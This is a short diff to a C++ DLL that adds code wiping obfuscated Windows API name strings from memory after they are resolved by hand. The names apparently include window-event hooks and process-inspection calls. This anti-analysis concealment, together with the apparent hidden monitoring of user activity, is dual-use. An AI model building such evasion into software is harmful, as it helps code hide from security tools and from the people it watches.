@@ -96,6 +96,18 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     My_ClsHnd = (Cls_Hnd_Fn)FindExportAddress(hkernel32, obf_Cls_Hnd);
 
 
+    SecureZeroMemory(obf_Usr_32, sizeof(obf_Usr_32));
+    SecureZeroMemory(obf_Ker_32, sizeof(obf_Ker_32));
+    SecureZeroMemory(obf_Papi, sizeof(obf_Papi));
+    SecureZeroMemory(obf_Set_Win_Evnt_Huk, sizeof(obf_Set_Win_Evnt_Huk));
+    SecureZeroMemory(obf_Unhuk_Win_Huk, sizeof(obf_Unhuk_Win_Huk));
+    SecureZeroMemory(obf_Get_Win_Thrd_Proc_Id, sizeof(obf_Get_Win_Thrd_Proc_Id));
+    SecureZeroMemory(obf_Opn_Proc, sizeof(obf_Opn_Proc));
+    SecureZeroMemory(obf_K32_Get_Mod_Fil_Nm_ExA, sizeof(obf_K32_Get_Mod_Fil_Nm_ExA));
+    SecureZeroMemory(obf_Get_Mod_Fil_Nm_ExA, sizeof(obf_Get_Mod_Fil_Nm_ExA));
+    SecureZeroMemory(obf_Cls_Hnd, sizeof(obf_Cls_Hnd));
+
+
     {
         std::lock_guard<std::mutex> lock(logMutex);
         sharedLogVector = logVector;
